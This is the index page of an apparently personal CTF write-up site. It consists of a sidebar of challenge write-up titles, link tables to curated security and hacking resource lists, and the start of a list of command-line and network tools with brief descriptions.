<!doctype html><html lang=en class="sidebar-visible no-js ayu"><meta charset=utf-8><title>Capture The Flag</title><meta name=robots content="noindex"><meta charset=utf-8><meta name=description content><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#ffffff"><link rel=icon href=favicon.svg><link rel="shortcut icon" href=favicon.png><link rel=stylesheet href=css/variables.css><link rel=stylesheet href=css/general.css><link rel=stylesheet href=css/chrome.css><link rel=stylesheet href=css/print.css media=print><link rel=stylesheet href=FontAwesome/css/font-awesome.css><link rel=stylesheet href=fonts/fonts.css><link rel=stylesheet href=highlight.css><link rel=stylesheet href=tomorrow-night.css><link rel=stylesheet href=ayu-highlight.css><link rel=stylesheet href=theme/mermaid.css><script>var path_to_root="",default_theme=window.matchMedia("(prefers-color-scheme: dark)").matches?"navy":"ayu"</script><script>var theme,sidebar;try{theme=localStorage.getItem('mdbook-theme'),sidebar=localStorage.getItem('mdbook-sidebar'),theme.startsWith('"')&&theme.endsWith('"')&&localStorage.setItem('mdbook-theme',theme.slice(1,theme.length-1)),sidebar.startsWith('"')&&sidebar.endsWith('"')&&localStorage.setItem('mdbook-sidebar',sidebar.slice(1,sidebar.length-1))}catch(a){}</script><script>var theme,html;try{theme=localStorage.getItem('mdbook-theme')}catch(a){}(theme===null||theme===void 0)&&(theme=default_theme),html=document.querySelector('html'),html.classList.remove('no-js'),html.classList.remove('ayu'),html.classList.add(theme),html.classList.add('js')</script><script>var html=document.querySelector('html'),sidebar='hidden';if(document.body.clientWidth>=1080){try{sidebar=localStorage.getItem('mdbook-sidebar')}catch(a){}sidebar=sidebar||'visible'}html.classList.remove('sidebar-visible'),html.classList.add("sidebar-"+sidebar)</script><nav id=sidebar class=sidebar aria-label="Table of contents"><div class=sidebar-scrollbox><ol class=chapter><li class="chapter-item expanded"><a href=index.html><strong aria-hidden=true>1.</strong> Introduction</a><li class="chapter-item expanded"><a href=MISCELLANEOUS.html><strong aria-hidden=true>2.</strong> Miscellaneous</a><li class="chapter-item expanded"><a href=ctf/index.html><strong aria-hidden=true>3.</strong> Capture The Flag</a><li><ol class=section><li class="chapter-item expanded"><a href=ctf/binary/index.html><strong aria-hidden=true>3.1.</strong> Binary Exploitation</a><li><ol class=section><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-handy_shellcode.html><strong aria-hidden=true>3.1.1.</strong> PicoCTF19 Handy Shellcode</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-overflow_0.html><strong aria-hidden=true>3.1.2.</strong> PicoCTF19 OverFlow 0</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-overflow_1.html><strong aria-hidden=true>3.1.3.</strong> PicoCTF19 OverFlow 1</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-overflow_2.html><strong aria-hidden=true>3.1.4.</strong> PicoCTF19 OverFlow 2</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-new_overflow_1.html><strong aria-hidden=true>3.1.5.</strong> PicoCTF19 NewOverFlow 1</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-new_overflow_2.html><strong aria-hidden=true>3.1.6.</strong> PicoCTF19 NewOverFlow 2</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-slippery_shellcode.html><strong aria-hidden=true>3.1.7.</strong> PicoCTF19 Slip-Shellcode</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-stringzz.html><strong aria-hidden=true>3.1.8.</strong> PicoCTF19 Stringzz</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf18-learn_libc.html><strong aria-hidden=true>3.1.9.</strong> PicoCTF18 learn-libc</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-rop32.html><strong aria-hidden=true>3.1.10.</strong> PicoCTF19 rop32</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-rop64.html><strong aria-hidden=true>3.1.11.</strong> PicoCTF19 rop64</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-leap_frog.html><strong aria-hidden=true>3.1.12.</strong> PicoCTF19 leap-frog</a><li class="chapter-item expanded"><a href=ctf/binary/picoctf19-canary.html><strong aria-hidden=true>3.1.13.</strong> PicoCTF19 CanaRy</a></ol><li class="chapter-item expanded"><a href=ctf/crypto/index.html><strong aria-hidden=true>3.2.</strong> Crypto</a><li><ol class=section><li class="chapter-item expanded"><a href=ctf/crypto/hackcon18-caesar.html><strong aria-hidden=true>3.2.1.</strong> Hackcon2018 Caesar Salad</a><li class="chapter-item expanded"><a href=ctf/crypto/hackcon18-salad.html><strong aria-hidden=true>3.2.2.</strong> Hackcon2018 Salad Up.</a><li class="chapter-item expanded"><a href=ctf/crypto/icectf18q-garfield.html><strong aria-hidden=true>3.2.3.</strong> IceCTF18Q Garfield</a><li class="chapter-item expanded"><a href=ctf/crypto/tjctf18-classic.html><strong aria-hidden=true>3.2.4.</strong> TJCTF18 Classic</a><li class="chapter-item expanded"><a href=ctf/crypto/picoctf19-numbers.html><strong aria-hidden=true>3.2.5.</strong> PicoCTF19 The Numbers</a><li class="chapter-item expanded"><a href=ctf/crypto/picoctf19-caesar.html><strong aria-hidden=true>3.2.6.</strong> PicoCTF19 Caesar</a><li class="chapter-item expanded"><a href=ctf/crypto/picoctf19-wavesoverlambda.html><strong aria-hidden=true>3.2.7.</strong> PicoCTF19 Waves Lambda</a><li class="chapter-item expanded"><a href=ctf/crypto/picoctf19-lacifrede.html><strong aria-hidden=true>3.2.8.</strong> PicoCTF19 La Cifra De</a><li class="chapter-item expanded"><a href=ctf/crypto/picoctf19-rsapopquiz.html><strong aria-hidden=true>3.2.9.</strong> PicoCTF19 RSA Pop Quiz</a><li class="chapter-item expanded"><a href=ctf/crypto/picoctf19-minirsa.html><strong aria-hidden=true>3.2.10.</strong> PicoCTF19 miniRSA</a><li class="chapter-item expanded"><a href=ctf/crypto/picoctf19-b00tl3gRSA2.html><strong aria-hidden=true>3.2.11.</strong> PicoCTF19 b00tl3gRSA2</a><li class="chapter-item expanded"><a href=ctf/crypto/picoctf19-b00tl3gRSA3.html><strong aria-hidden=true>3.2.12.</strong> PicoCTF19 b00tl3gRSA3</a><li class="chapter-item expanded"><a href=ctf/crypto/picoctf19-john_pollard.html><strong aria-hidden=true>3.2.13.</strong> PicoCTF19 john_pollard</a><li class="chapter-item expanded"><a href=ctf/crypto/picoctf19-aesabc.html><strong aria-hidden=true>3.2.14.</strong> PicoCTF19 AES-ABC</a><li class="chapter-item expanded"><a href=ctf/crypto/auctf20-extraordinary.html><strong aria-hidden=true>3.2.15.</strong> AUCTF20 Extraordinary</a></ol><li class="chapter-item expanded"><a href=ctf/forensics/index.html><strong aria-hidden=true>3.3.</strong> Forensics</a><li><ol class=section><li class="chapter-item expanded"><a href=ctf/forensics/aeroctf20-drawings.html><strong aria-hidden=true>3.3.1.</strong> AeroCTF20 Drawings</a><li class="chapter-item expanded"><a href=ctf/forensics/picoctf19-garden.html><strong aria-hidden=true>3.3.2.</strong> PicoCTF19 Garden</a><li class="chapter-item expanded"><a href=ctf/forensics/picoctf19-unzip.html><strong aria-hidden=true>3.3.3.</strong> PicoCTF19 Unzip</a><li class="chapter-item expanded"><a href=ctf/forensics/picoctf19-so-meta.html><strong aria-hidden=true>3.3.4.</strong> PicoCTF19 So Meta</a><li class="chapter-item expanded"><a href=ctf/forensics/picoctf19-what-lies-within.html><strong aria-hidden=true>3.3.5.</strong> PicoCTF19 Lies Within</a><li class="chapter-item expanded"><a href=ctf/forensics/picoctf19-extensions.html><strong aria-hidden=true>3.3.6.</strong> PicoCTF19 Extensions</a><li class="chapter-item expanded"><a href=ctf/forensics/picoctf19-shark-on-wire-1.html><strong aria-hidden=true>3.3.7.</strong> PicoCTF19 Shark Wire</a><li class="chapter-item expanded"><a href=ctf/forensics/picoctf19-whitepages.html><strong aria-hidden=true>3.3.8.</strong> PicoCTF19 WhitePages</a><li class="chapter-item expanded"><a href=ctf/forensics/picoctf19-like1000.html><strong aria-hidden=true>3.3.9.</strong> PicoCTF19 like1000</a></ol><li class="chapter-item expanded"><a href=ctf/misc/index.html><strong aria-hidden=true>3.4.</strong> Misc</a><li><ol class=section><li class="chapter-item expanded"><a href=ctf/misc/auctf20-bash.html><strong aria-hidden=true>3.4.1.</strong> AUCTF20 Bash</a><li class="chapter-item expanded"><a href=ctf/misc/corelightctf20.html><strong aria-hidden=true>3.4.2.</strong> CorelightCTF20</a></ol><li class="chapter-item expanded"><a href=ctf/reversing/index.html><strong aria-hidden=true>3.5.</strong> Reversing</a><li><ol class=section><li class="chapter-item expanded"><a href=ctf/reversing/auctf20-mrgame.html><strong aria-hidden=true>3.5.1.</strong> AUCTF20 Mr. Game</a></ol><li class="chapter-item expanded"><a href=ctf/web/index.html><strong aria-hidden=true>3.6.</strong> Web</a><li><ol class=section><li class="chapter-item expanded"><a href=ctf/web/seccon19-web_search.html><strong aria-hidden=true>3.6.1.</strong> SECCON19 Web Search</a><li class="chapter-item expanded"><a href=ctf/web/tmctf19-finals-containers.html><strong aria-hidden=true>3.6.2.</strong> TMCTF19F Container</a><li class="chapter-item expanded"><a href=ctf/web/insctf20-quals-lowdeep.html><strong aria-hidden=true>3.6.3.</strong> INSCTF20Q LowDeep</a></ol></ol></ol></div><div id=sidebar-resize-handle class=sidebar-resize-handle></div></nav><div id=page-wrapper class=page-wrapper><div class=page><div id=menu-bar-hover-placeholder></div><div id=menu-bar class="menu-bar sticky bordered"><div class=left-buttons><button id=sidebar-toggle class=icon-button type=button title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls=sidebar>
<i class="fa fa-bars"></i></button>
<button id=theme-toggle class=icon-button type=button title="Change theme" aria-label="Change theme" aria-haspopup=true aria-expanded=false aria-controls=theme-list>
<i class="fa fa-paint-brush"></i></button><ul id=theme-list class=theme-popup aria-label=Themes role=menu><li role=none><button role=menuitem class=theme id=light>Light</button><li role=none><button role=menuitem class=theme id=rust>Rust</button><li role=none><button role=menuitem class=theme id=coal>Coal</button><li role=none><button role=menuitem class=theme id=navy>Navy</button><li role=none><button role=menuitem class=theme id=ayu>Ayu (default)</button></ul><button id=search-toggle class=icon-button type=button title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded=false aria-keyshortcuts=S aria-controls=searchbar>
<i class="fa fa-search"></i></button></div><h1 class=menu-title>Capture The Flag</h1><div class=right-buttons><a href=print.html title="Print this book" aria-label="Print this book"><i id=print-button class="fa fa-print"></i></a><a href=https://github.com/sgama/ctf.samsongama.com title="Git repository" aria-label="Git repository"><i id=git-repository-button class="fa fa-github"></i></a></div></div><div id=search-wrapper class=hidden><form id=searchbar-outer class=searchbar-outer><input type=search name=search id=searchbar name=searchbar placeholder="Search this book ..." aria-controls=searchresults-outer aria-describedby=searchresults-header></form><div id=searchresults-outer class="searchresults-outer hidden"><div id=searchresults-header class=searchresults-header></div><ul id=searchresults></ul></div></div><script>document.getElementById('sidebar-toggle').setAttribute('aria-expanded',sidebar==='visible'),document.getElementById('sidebar').setAttribute('aria-hidden',sidebar!=='visible'),Array.from(document.querySelectorAll('#sidebar a')).forEach(function(a){a.setAttribute('tabIndex',sidebar==='visible'?0:-1)})</script><div id=content class=content><main><h1><a class=header href=#introduction id=introduction>Introduction</a></h1><p><a href=https://actions-badge.atrox.dev/sgama/ctf.samsongama.com/goto><img src="https://img.shields.io/endpoint.svg?url=https%3A%2F%2Factions-badge.atrox.dev%2Fsgama%2Fctf.samsongama.com%2Fbadge&style=flat-square" alt="Build Status"></a>
<img src="https://img.shields.io/github/commit-activity/m/sgama/ctf.samsongama.com?style=flat-square" alt="GitHub commit activity">
<img src="https://img.shields.io/github/last-commit/sgama/ctf.samsongama.com?style=flat-square" alt="GitHub last commit">
<img src="https://img.shields.io/github/repo-size/sgama/ctf.samsongama.com?style=flat-square" alt="GitHub repo size"><p><strong>A collection of awesome lists for hackers, pentesters & security researchers.</strong><p>Source: <a href=https://github.com/Hack-with-Github/Awesome-Hacking>https://github.com/Hack-with-Github/Awesome-Hacking</a><h2><a class=header href=#awesome-repositories id=awesome-repositories>Awesome Repositories</a></h2><table><thead><tr><th>Repository<th>Description<tbody><tr><td><a href=https://github.com/ashishb/android-security-awesome>Android Security</a><td>Collection of Android security related resources<tr><td><a href=https://github.com/paragonie/awesome-appsec>AppSec</a><td>Resources for learning about application security<tr><td><a href=https://github.com/redhuntlabs/Awesome-Asset-Discovery>Asset Discovery</a><td>List of resources which help during asset discovery phase of a security assessment engagement<tr><td><a href=https://github.com/djadmin/awesome-bug-bounty>Bug Bounty</a><td>List of Bug Bounty Programs and write-ups from the Bug Bounty hunters<tr><td><a href=https://github.com/apsdehal/awesome-ctf>CTF</a><td>List of CTF frameworks, libraries, resources and softwares<tr><td><a href=https://github.com/joe-shenouda/awesome-cyber-skills>Cyber Skills</a><td>Curated list of hacking environments where you can train your cyber skills legally and safely<tr><td><a href=https://github.com/devsecops/awesome-devsecops>DevSecOps</a><td>List of awesome DevSecOps tools with the help from community experiments and contributions<tr><td><a href=https://github.com/FabioBaroni/awesome-exploit-development>Exploit Development</a><td>Resources for learning about Exploit Development<tr><td><a href=https://github.com/secfigo/Awesome-Fuzzing>Fuzzing</a><td>List of fuzzing resources for learning Fuzzing and initial phases of Exploit Development like root cause analysis<tr><td><a href=https://github.com/carpedm20/awesome-hacking>Hacking</a><td>List of awesome Hacking tutorials, tools and resources<tr><td><a href=https://github.com/vitalysim/Awesome-Hacking-Resources>Hacking Resources</a><td>Collection of hacking / penetration testing resources to make you better!<tr><td><a href=https://github.com/paralax/awesome-honeypots>Honeypots</a><td>List of honeypot resources<tr><td><a href=https://github.com/meirwah/awesome-incident-response>Incident Response</a><td>List of tools for incident response<tr><td><a href=https://github.com/hslatman/awesome-industrial-control-system-security>Industrial Control System Security</a><td>List of resources related to Industrial Control System (ICS) security<tr><td><a href=https://github.com/onlurking/awesome-infosec>InfoSec</a><td>List of awesome infosec courses and training resources<tr><td><a href=https://github.com/nebgnahz/awesome-iot-hacks>IoT Hacks</a><td>Collection of Hacks in IoT Space<tr><td><a href=https://github.com/rshipp/awesome-malware-analysis>Malware Analysis</a><td>List of awesome malware analysis tools and resources<tr><td><a href=https://github.com/jivoi/awesome-osint>OSINT</a><td>List of amazingly awesome Open Source Intelligence (OSINT) tools and resources<tr><td><a href=https://github.com/ashishb/osx-and-ios-security-awesome>OSX and iOS Security</a><td>OSX and iOS related security tools<tr><td><a href=https://github.com/caesar0301/awesome-pcaptools>Pcaptools</a><td>Collection of tools developed by researchers in the Computer Science area to process network traces<tr><td><a href=https://github.com/enaqx/awesome-pentest>Pentest</a><td>List of awesome penetration testing resources, tools and other shiny things<tr><td><a href=https://github.com/ziadoz/awesome-php#security>PHP Security</a><td>Libraries for generating secure random numbers, encrypting data and scanning for vulnerabilities<tr><td><a href=https://github.com/yeyintminthuhtut/Awesome-Red-Teaming>Red Teaming</a><td>List of Awesome Red Team / Red Teaming Resources<tr><td><a href=https://github.com/fdivrp/awesome-reversing>Reversing</a><td>List of awesome reverse engineering resources<tr><td><a href=https://github.com/PaulSec/awesome-sec-talks>Sec Talks</a><td>List of awesome security talks<tr><td><a href=https://github.com/danielmiessler/SecLists>SecLists</a><td>Collection of multiple types of lists used during security assessments<tr><td><a href=https://github.com/sbilly/awesome-security>Security</a><td>Collection of awesome software, libraries, documents, books, resources and cools stuffs about security<tr><td><a href=https://github.com/puresec/awesome-serverless-security/>Serverless Security</a><td>Collection of Serverless security related resources<tr><td><a href=https://github.com/v2-dev/awesome-social-engineering>Social Engineering</a><td>List of awesome social engineering resources<tr><td><a href=https://github.com/mre/awesome-static-analysis>Static Analysis</a><td>List of static analysis tools, linters and code quality checkers for various programming languages<tr><td><a href=https://github.com/hslatman/awesome-threat-intelligence>Threat Intelligence</a><td>List of Awesome Threat Intelligence resources<tr><td><a href=https://github.com/jaredthecoder/awesome-vehicle-security>Vehicle Security</a><td>List of resources for learning about vehicle security and car hacking<tr><td><a href=https://github.com/re-pronin/awesome-vulnerability-research>Vulnerability Research</a><td>List of resources about Vulnerability Research<tr><td><a href=https://github.com/infoslack/awesome-web-hacking>Web Hacking</a><td>List of web application security<tr><td><a href=https://github.com/yeyintminthuhtut/Awesome-Advanced-Windows-Exploitation-References>Windows Exploitation - Advanced</a><td>List of Awesome Advanced Windows Exploitation References<tr><td><a href=https://github.com/0x90/wifi-arsenal>WiFi Arsenal</a><td>Pack of various useful/useless tools for 802.11 hacking<tr><td><a href=https://github.com/InQuest/awesome-yara>YARA</a><td>List of awesome YARA rules, tools, and people<tr><td><a href=https://github.com/sundowndev/hacker-roadmap>Hacker Roadmap</a><td>A guide for amateur pen testers and a collection of hacking tools, resources and references to practice ethical hacking.</table><h2><a class=header href=#other-useful-repositories id=other-useful-repositories>Other useful repositories</a></h2><table><thead><tr><th>Repository<th>Description<tbody><tr><td><a href=https://github.com/yenchenlin/awesome-adversarial-machine-learning>Adversarial Machine Learning</a><td>Curated list of awesome adversarial machine learning resources<tr><td><a href=https://github.com/RandomAdversary/Awesome-AI-Security>AI Security</a><td>Curated list of AI security resources<tr><td><a href=https://github.com/shieldfy/API-Security-Checklist>API Security Checklist</a><td>Checklist of the most important security countermeasures when designing, testing, and releasing your API<tr><td><a href=https://github.com/kbandla/APTnotes>APT Notes</a><td>Various public documents, whitepapers and articles about APT campaigns<tr><td><a href=https://github.com/ngalongc/bug-bounty-reference>Bug Bounty Reference</a><td>List of bug bounty write-up that is categorized by the bug nature<tr><td><a href=https://github.com/sobolevn/awesome-cryptography>Cryptography</a><td>Cryptography resources and tools<tr><td><a href=https://github.com/SandySekharan/CTF-tool>CTF Tool</a><td>List of Capture The Flag (CTF) frameworks, libraries, resources and softwares<tr><td><a href=https://github.com/qazbnm456/awesome-cve-poc>CVE PoC</a><td>List of CVE Proof of Concepts (PoCs)<tr><td><a href=https://github.com/clong/DetectionLab>Detection Lab</a><td>Vagrant & Packer scripts to build a lab environment complete with security tooling and logging best practices<tr><td><a href=https://github.com/Cugu/awesome-forensics>Forensics</a><td>List of awesome forensic analysis tools and resources<tr><td><a href=https://github.com/EbookFoundation/free-programming-books>Free Programming Books</a><td>Free programming books for developers<tr><td><a href=https://github.com/bt3gl/Gray-Hacker-Resources>Gray Hacker Resources</a><td>Useful for CTFs, wargames, pentesting<tr><td><a href=https://github.com/Hacker0x01/hacker101>Hacker101</a><td>A free class for web security by HackerOne<tr><td><a href=https://github.com/gradiuscypher/infosec_getting_started>Infosec Getting Started</a><td>A collection of resources, documentation, links, etc to help people learn about Infosec<tr><td><a href=https://github.com/rmusser01/Infosec_Reference>Infosec Reference</a><td>Information Security Reference That Doesn't Suck<tr><td><a href=https://github.com/sroberts/awesome-iocs>IOC</a><td>Collection of sources of indicators of compromise<tr><td><a href=https://github.com/xairy/linux-kernel-exploitation>Linux Kernel Exploitation</a><td>A bunch of links related to Linux kernel fuzzing and exploitation<tr><td><a href=https://github.com/meitar/awesome-lockpicking>Lockpicking</a><td>Resources relating to the security and compromise of locks, safes, and keys.<tr><td><a href=https://github.com/jivoi/awesome-ml-for-cybersecurity>Machine Learning for Cyber Security</a><td>Curated list of tools and resources related to the use of machine learning for cyber security<tr><td><a href=https://github.com/foospidy/payloads>Payloads</a><td>Collection of web attack payloads<tr><td><a href=https://github.com/swisskyrepo/PayloadsAllTheThings>PayloadsAllTheThings</a><td>List of useful payloads and bypass for Web Application Security and Pentest/CTF<tr><td><a href=https://github.com/coreb1t/awesome-pentest-cheat-sheets>Pentest Cheatsheets</a><td>Collection of the cheat sheets useful for pentesting<tr><td><a href=https://github.com/nixawk/pentest-wiki>Pentest Wiki</a><td>A free online security knowledge library for pentesters / researchers<tr><td><a href=https://github.com/berzerk0/Probable-Wordlists>Probable Wordlists</a><td>Wordlists sorted by probability originally created for password generation and testing<tr><td><a href=https://github.com/FuzzySecurity/Resource-List>Resource List</a><td>Collection of useful GitHub projects loosely categorised<tr><td><a href=https://github.com/onethawt/reverseengineering-reading-list>Reverse Engineering</a><td>List of Reverse Engineering articles, books, and papers<tr><td><a href=https://github.com/cn0xroot/RFSec-ToolKit>RFSec-ToolKit</a><td>Collection of Radio Frequency Communication Protocol Hacktools<tr><td><a href=https://github.com/andrewjkerr/security-cheatsheets>Security Cheatsheets</a><td>Collection of cheatsheets for various infosec tools and topics<tr><td><a href=https://github.com/zbetcheckin/Security_list>Security List</a><td>Great security list for fun and profit<tr><td><a href=https://github.com/alebcay/awesome-shell>Shell</a><td>List of awesome command-line frameworks, toolkits, guides and gizmos to make complete use of shell<tr><td><a href=https://github.com/Cyb3rWard0g/ThreatHunter-Playbook>ThreatHunter-Playbook</a><td>A Threat hunter's playbook to aid the development of techniques and hypothesis for hunting campaigns<tr><td><a href=https://github.com/qazbnm456/awesome-web-security>Web Security</a><td>Curated list of Web Security materials and resources</table><hr><p>Placeholder for future data.<p>Dumping possible syntax here<pre><code class=language-javascript>var s = &quot;JavaScript syntax highlighting&quot;;
alert(s);
</code></pre><pre><code class=language-python>s = &quot;Python syntax highlighting&quot;
print s
</code></pre><pre><code>No language indicated, so no syntax highlighting. 
But let's throw in a &lt;b&gt;tag&lt;/b&gt;.
</code></pre><table><thead><tr><th>Tables<th align=center>Are<th align=right>Cool<tbody><tr><td>col 3 is<td align=center>right-aligned<td align=right>$1600<tr><td>col 2 is<td align=center>centered<td align=right>$12<tr><td>zebra stripes<td align=center>are neat<td align=right>$1</table><hr><p>Example of MermaidJS<pre class=mermaid>graph TD;
    A-->B;
    A-->C;
    B-->D;
    C-->D;
</pre><h1><a class=header href=#miscellaneous id=miscellaneous>Miscellaneous</a></h1><p>Source: <a href=https://github.com/trimstray/the-book-of-secret-knowledge>https://github.com/trimstray/the-book-of-secret-knowledge</a><p>Regex: <code>^(&nbsp);(&nbsp);:[a-zA-Z0-9_]*:\s</code>, <code>:[a-zA-Z0-9_]*:</code>,<hr><h2><a class=header href=#table-of-contents id=table-of-contents>Table of Contents</a></h2><p>Only main chapters:<ul><li><strong><a href=MISCELLANEOUS.html#cli-tools-toc>CLI Tools</a></strong><li><strong><a href=MISCELLANEOUS.html#gui-tools-toc>GUI Tools</a></strong><li><strong><a href=MISCELLANEOUS.html#web-tools-toc>Web Tools</a></strong><li><strong><a href=MISCELLANEOUS.html#systemsservices-toc>Systems/Services</a></strong><li><strong><a href=MISCELLANEOUS.html#networks-toc>Networks</a></strong><li><strong><a href=MISCELLANEOUS.html#containersorchestration-toc>Containers/Orchestration</a></strong><li><strong><a href=MISCELLANEOUS.html#manualshowtostutorials-toc>Manuals/Howtos/Tutorials</a></strong><li><strong><a href=MISCELLANEOUS.html#inspiring-lists-toc>Inspiring Lists</a></strong><li><strong><a href=MISCELLANEOUS.html#blogspodcastsvideos-toc>Blogs/Podcasts/Videos</a></strong><li><strong><a href=MISCELLANEOUS.html#hackingpenetration-testing-toc>Hacking/Penetration Testing</a></strong><li><strong><a href=MISCELLANEOUS.html#your-daily-knowledge-and-news-toc>Your daily knowledge and news</a></strong><li><strong><a href=MISCELLANEOUS.html#other-cheat-sheets-toc>Other Cheat Sheets</a></strong><li><strong><a href=MISCELLANEOUS.html#one-liners-toc>One-liners</a></strong><li><strong><a href=MISCELLANEOUS.html#shell-functions-toc>Shell functions</a></strong></ul><h2><a class=header href=#the-book-of-secret-knowledge-chapters id=the-book-of-secret-knowledge-chapters>The Book of Secret Knowledge (Chapters)</a></h2><h4><a class=header href=#cli-tools-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=cli-tools-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>CLI Tools <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#shells id=shells>Shells</a></h5><p><a href=https://www.gnu.org/software/bash/><b>GNU Bash</b></a> - is an sh-compatible shell that incorporates useful features from the Korn shell and C shell.<br><a href=https://www.zsh.org/><b>Zsh</b></a> - is a shell designed for interactive use, although it is also a powerful scripting language.<br><a href=https://tcl-lang.org/><b>tclsh</b></a> - is a very powerful cross-platform shell, suitable for a huge range of uses.<br><a href=https://github.com/Bash-it/bash-it><b>bash-it</b></a> - is a framework for using, developing and maintaining shell scripts and custom commands.<br><a href=https://ohmyz.sh/><b>Oh My ZSH!</b></a> - is the best framework for managing your Zsh configuration.<br><a href=https://github.com/oh-my-fish/oh-my-fish><b>Oh My Fish</b></a> - the Fishshell framework.<br><a href=https://github.com/starship/starship><b>Starship</b></a> - the cross-shell prompt written in Rust.<br><a href=https://github.com/romkatv/powerlevel10k><b>powerlevel10k</b></a> - is a fast reimplementation of Powerlevel9k ZSH theme.<br><h5><a class=header href=#managers id=managers>Managers</a></h5><p><a href=https://midnight-commander.org/><b>Midnight Commander</b></a> - is a visual file manager, licensed under GNU General Public License.<br><a href=https://github.com/ranger/ranger><b>ranger</b></a> - is a VIM-inspired filemanager for the console.<br><a href=https://github.com/jarun/nnn><b>nnn</b></a> - is a tiny, lightning fast, feature-packed file manager.<br><a href=https://www.gnu.org/software/screen/><b>screen</b></a> - is a full-screen window manager that multiplexes a physical terminal.<br><a href=https://github.com/tmux/tmux/wiki><b>tmux</b></a> - is a terminal multiplexer, lets you switch easily between several programs in one terminal.<br><a href=https://github.com/peikk0/tmux-cssh><b>tmux-cssh</b></a> - is a tool to set comfortable and easy to use functionality, clustering and synchronizing tmux-sessions.<br><h5><a class=header href=#text-editors id=text-editors>Text editors</a></h5><p><a href=http://ex-vi.sourceforge.net/><b>vi</b></a> - is one of the most common text editors on Unix.<br><a href=https://www.vim.org/><b>vim</b></a> - is a highly configurable text editor.<br><a href=https://www.gnu.org/software/emacs/><b>emacs</b></a> - is an extensible, customizable, free/libre text editor - and more.<br><a href=https://github.com/zyedidia/micro><b>micro</b></a> - is a modern and intuitive terminal-based text editor.<br><a href=https://neovim.io/><b>neovim</b></a> - is a free open source, powerful, extensible and usable code editor.<br><h5><a class=header href=#files-and-directories id=files-and-directories>Files and directories</a></h5><p><a href=https://github.com/sharkdp/fd><b>fd</b></a> - is a simple, fast and user-friendly alternative to find.<br><h5><a class=header href=#network id=network>Network</a></h5><p><a href=https://www.putty.org/><b>PuTTY</b></a> - is an SSH and telnet client, developed originally by Simon Tatham.<br><a href=https://nmap.org/><b>nmap</b></a> - is a free and open source (license) utility for network discovery and security auditing.<br><a href=https://github.com/zmap/zmap><b>zmap</b></a> - is a fast single packet network scanner designed for Internet-wide network surveys.<br><a href=https://github.com/robertdavidgraham/masscan><b>masscan</b></a> - is the fastest Internet port scanner, spews SYN packets asynchronously.<br><a href=https://github.com/gvb84/pbscan><b>pbscan</b></a> - is a faster and more efficient stateless SYN scanner and banner grabber.<br><a href=http://www.hping.org/><b>hping</b></a> - is a command-line oriented TCP/IP packet assembler/analyzer.<br><a href=https://github.com/traviscross/mtr><b>mtr</b></a> - is a tool that combines the functionality of the 'traceroute' and 'ping' programs in a single network diagnostic tool.<br><a href=https://github.com/mehrdadrad/mylg><b>mylg</b></a> - is an open source utility which combines the functions of the different network probes in one diagnostic tool.<br><a href=http://netcat.sourceforge.net/><b>netcat</b></a> - is a networking utility which reads and writes data across network connections, using the TCP/IP protocol.<br><a href=https://www.tcpdump.org/><b>tcpdump</b></a> - is a powerful command-line packet analyzer.<br><a href=https://www.wireshark.org/docs/man-pages/tshark.html><b>tshark</b></a> - is a tool that allows us to dump and analyze network traffic (wireshark cli).<br><a href=https://termshark.io/><b>Termshark</b></a> - is a simple terminal user-interface for tshark.<br><a href=https://github.com/jpr5/ngrep><b>ngrep</b></a> - is like GNU grep applied to the network layer.<br><a href=https://github.com/mechpen/sockdump><b>sockdump</b></a> - dump unix domain socket traffic.<br><a href=https://github.com/google/stenographer><b>stenographer</b></a> - is a packet capture solution which aims to quickly spool all packets to disk.<br><a href=https://github.com/sachaos/tcpterm><b>tcpterm</b></a> - visualize packets in TUI.<br><a href=https://github.com/tgraf/bmon><b>bmon</b></a> - is a monitoring and debugging tool to capture networking related statistics and prepare them visually.<br><a href=http://iptraf.seul.org/2.6/manual.html#installation><b>iptraf-ng</b></a> - is a console-based network monitoring program for Linux that displays information about IP traffic.<br><a href=https://github.com/vergoh/vnstat><b>vnstat</b></a> - is a network traffic monitor for Linux and BSD.<br><a href=https://iperf.fr/><b>iPerf3</b></a> - is a tool for active measurements of the maximum achievable bandwidth on IP networks.<br><a href=https://github.com/Microsoft/Ethr><b>ethr</b></a> - is a Network Performance Measurement Tool for TCP, UDP & HTTP.<br><a href=https://github.com/jwbensley/Etherate><b>Etherate</b></a> - is a Linux CLI based Ethernet and MPLS traffic testing tool.<br><a href=https://github.com/mpolden/echoip><b>echoip</b></a> - is a IP address lookup service.<br><a href=https://github.com/troglobit/nemesis><b>Nemesis</b></a> - packet manipulation CLI tool; craft and inject packets of several protocols.<br><a href=https://github.com/packetfu/packetfu><b>packetfu</b></a> - a mid-level packet manipulation library for Ruby.<br><a href=https://scapy.net/><b>Scapy</b></a> - packet manipulation library; forge, send, decode, capture packets of a wide number of protocols.<br><a href=https://github.com/SecureAuthCorp/impacket><b>impacket</b></a> - is a collection of Python classes for working with network protocols.<br><a href=https://github.com/arthepsy/ssh-audit><b>ssh-audit</b></a> - is a tool for SSH server auditing.<br><a href=https://aria2.github.io/><b>aria2</b></a> - is a lightweight multi-protocol & multi-source command-line download utility.<br><a href=https://github.com/x-way/iptables-tracer><b>iptables-tracer</b></a> - observe the path of packets through the iptables chains.<br><h5><a class=header href=#network-dns id=network-dns>Network (DNS)</a></h5><p><a href=https://github.com/farrokhi/dnsdiag><b>dnsdiag</b></a> - is a DNS diagnostics and performance measurement tools.<br><a href=https://github.com/mschwager/fierce><b>fierce</b></a> - is a DNS reconnaissance tool for locating non-contiguous IP space.<br><a 